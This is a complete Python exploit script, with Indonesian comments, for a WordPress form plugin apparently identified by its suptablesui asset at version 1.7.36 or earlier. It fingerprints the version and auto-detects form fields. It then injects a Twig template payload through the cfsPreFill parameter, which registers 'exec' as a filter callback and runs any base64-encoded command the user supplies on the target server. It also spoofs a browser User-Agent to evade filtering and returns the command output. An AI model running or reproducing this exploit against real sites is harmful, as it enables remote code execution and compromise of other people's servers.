import argparse
import base64
import re
import requests
import urllib3

# Sembunyikan warning SSL untuk kenyamanan
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class status:
    OKGREEN = "\033[32m"
    WARNING = "\033[33m"
    FAIL = "\033[31m"
    ENDC = "\033[0m"
    NOCOLOR = False
    VERBOSE = False

    @classmethod
    def print(cls, message: str, status: str = None):
        if cls.NOCOLOR:
            print(message)
            return
        match status:
            case "FAIL":
                print(f"{cls.FAIL}{message}{cls.ENDC}")
            case "WARNING":
                print(f"{cls.WARNING}{message}{cls.ENDC}")
            case "SUCCESS":
                print(f"{cls.OKGREEN}{message}{cls.ENDC}")
            case _:
                print(message)

    @classmethod
    def vprint(cls, message: str, status: str = None):
        if cls.VERBOSE:
            cls.print(message, status)

def get_page(url: str) -> str:
    # Ditambahkan headers agar tidak kena Error 415/403 (Bypass WAF sederhana)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    }
    try:
        res = requests.get(url, headers=headers, verify=False, timeout=15)
        res.raise_for_status()
        return res.text
    # FIX TYPO: excpetions -> exceptions
    except requests.exceptions.RequestException as e:
        status.print(f"Request to {url} failed: {e}", "FAIL")
        exit(1)

def get_version(body: str) -> str or None:
    pattern = r'suptablesui.min.css\?ver=([0-9\.]+)'
    match = re.search(pattern, body)
    if match:
        return match.group(1)
    return None

def is_vulnerable(version: str) -> bool:
    if not version: return False
    try:
        major, minor, patch = map(int, version.split("."))
        return (major, minor, patch) <= (1, 7, 36)
    except:
        status.vprint(f"Failed to parse version.", "WARNING")
        return False

def detect_version(body: str):
    version = get_version(body)
    vulnerable = is_vulnerable(version)
    if vulnerable:
        status.vprint(f"Detected version {version} is vulnerable.", "SUCCESS")
    elif version is not None:
        status.vprint(f"Detected version {version} is not vulnerable.", "WARNING")

def detect_fields(body: str) -> list[str] or None:
    pattern = r'data-name="([^"]+)"'
    field_names = list(set(re.findall(pattern, body)))
    if field_names:
        status.print(f"Detected fields: {field_names}", "SUCCESS")
        return field_names
    return None

def handle_field(body: str, field: str or None) -> str:
    if field:
        return field
    fields = detect_fields(body)
    if fields:
        status.vprint(f"Using automatically detected field: {fields[0]}")
        return fields[0]
    status.print("Failed to detect fields.", "FAIL")
    exit(1)

def get_output(field: str, body: str) -> str or None:
    pattern = rf'name="fields\[{re.escape(field)}\]"\s+value="([^"]+)"'
    match = re.search(pattern, body)
    if match:
        return match.group(1)
    return None

def exploit(url: str, payload: str, field: str) -> str or None:
    utf8_var = "{%set a%}UTF-8{%endset%}"
    base64_var = "{%set b%}BASE64{%endset%}"
    twig_payload = "{%set p%}" + base64.urlsafe_b64encode(payload.encode('utf-8')).decode('utf-8') + "{%endset%}"
    twig_payload_decode = "{%set p = p|convert_encoding((a), (b))%}"
    register_callback = "{%set e%}exec{%endset%}{{_self.env.registerUndefinedFilterCallback(e|lower)}}"
    exec_filter = "{{_self.env.getFilter(p)}}"

    ssti_payload = utf8_var + base64_var + twig_payload + twig_payload_decode + register_callback + exec_filter
    status.vprint(f"Payload: {payload}")

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    }
    params = {
        "cfsPreFill": 1,
        field: ssti_payload
    }

    try:
        res = requests.get(url, params=params, headers=headers, verify=False, timeout=20)
        res.raise_for_status()
        return get_output(field, res.text)
    # FIX TYPO: excpetions -> exceptions
    except requests.exceptions.RequestException as e:
        status.print(f"Exploit request to {url} failed: {e}", "FAIL")
        exit(1)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--field", type=str, help="Valid field name")
    parser.add_argument("--no-color", action="store_true", help="No colors")
    parser.add_argument("--verbose", "-v", action="store_true")
    parser.add_argument("url", type=str, help="Target URL")
    parser.add_argument("payload", type=str, help="Command to execute")

    args = parser.parse_args()
    status.NOCOLOR = args.no_color
    status.VERBOSE = args.verbose

    body = get_page(args.url)
    detect_version(body)
    field = handle_field(body, args.field)

    output = exploit(args.url, args.payload, field)

    if output:
        if output.lower() == field.lower():
            status.print("Output is same as field. Maybe try a different field?", "WARNING")
        status.print(f"\n[RESULT]:\n{output}")
    else:
        status.print(f"Failed to extract output with field '{field}'", "FAIL")

if __name__ == "__main__":
    main()
